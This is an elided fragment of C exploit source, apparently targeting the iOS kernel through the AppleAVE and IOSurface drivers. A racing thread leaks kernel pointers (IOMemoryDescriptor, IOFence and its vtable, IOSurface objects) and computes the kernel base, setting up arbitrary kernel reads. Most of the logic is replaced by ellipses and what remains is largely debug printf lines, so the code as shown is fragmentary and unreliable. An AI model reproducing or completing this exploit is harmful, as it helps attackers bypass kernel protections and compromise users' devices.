...
void* kernel_read_surface_bulk_race_thread(void * _args) {
	...
	*/
	...
	printf("block to leak: %p", *(void**)input_buffer);
	...
	while(!*(int*)should_stop) {
		...
		if (NULL != *(void**)(output_buffer+0x20) && 0 == *(uint32_t*)(output_buffer + 0x8))
		{
			...
			printf("Leaked IOMemoryDescriptor: %p", *(void**)(output_buffer+0x20));
...
/*
	...
	printf("Bulk setter quitted");
	for(i = 0; i <= 0x20; i += 8) {
		printf("leak[0x%x] = %p", i, *(void**)(output_buffer+i));
	}
...
kern_return_t kernel_read_leak_kernel_base(void ** kernel_base) {
	...
	printf("Before ORing: %p", (void*)value);

	value |= 0xfffffff000000000;
	iofence = (void*)value;

	printf("IOFence: %p", iofence);
	//printf("IOFence, real: %p", (void*)r64(apple_ave_pwn_get_bad_surface_kernel_ptr() + 0x210));
	...
	printf("IOFence's vtable: %p", iofence_vtable);
	//printf("IOFence's vtable, real: %p", (void*)r64(r64(apple_ave_pwn_get_bad_surface_kernel_ptr() + 0x210)));
...
kern_return_t kernel_read_init() {
	...
	printf("kernel pointer of IOSurface object %d is %p", g_surface_id_for_arbitrary_read, g_surface_kernel_ptr);
